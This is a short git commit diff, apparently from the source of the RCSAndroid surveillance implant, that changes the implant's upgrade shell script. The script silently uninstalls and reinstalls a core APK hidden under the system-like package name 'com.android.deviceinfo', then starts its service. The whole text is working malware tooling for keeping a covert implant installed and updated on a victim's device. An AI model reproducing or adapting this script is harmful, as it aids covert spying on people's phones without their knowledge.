6962e9a4e30c326ae4fb86394d6bad4daaacc5f8
Alberto Pelliccione <a.pelliccione@hackingteam.com>
2014-03-10 12:52:19 +0100

    Fixed upgrade script

--- RCSAndroid/server/template/upgrade.sh
+++ RCSAndroid/server/template/upgrade.sh
@@ -1,7 +1,7 @@
 export LD_LIBRARY_PATH=/vendor/lib:/system/lib
 
 rm /sdcard/core.*.apk
-mv /data/data/com.android.deviceinfo/app_qza/core.*.apk /sdcard
+cp /data/data/com.android.deviceinfo/app_qza/core.*.apk /sdcard
 pm uninstall -k com.android.deviceinfo
 pm install /sdcard/core.*.apk
 am startservice com.android.deviceinfo/.ServiceMain
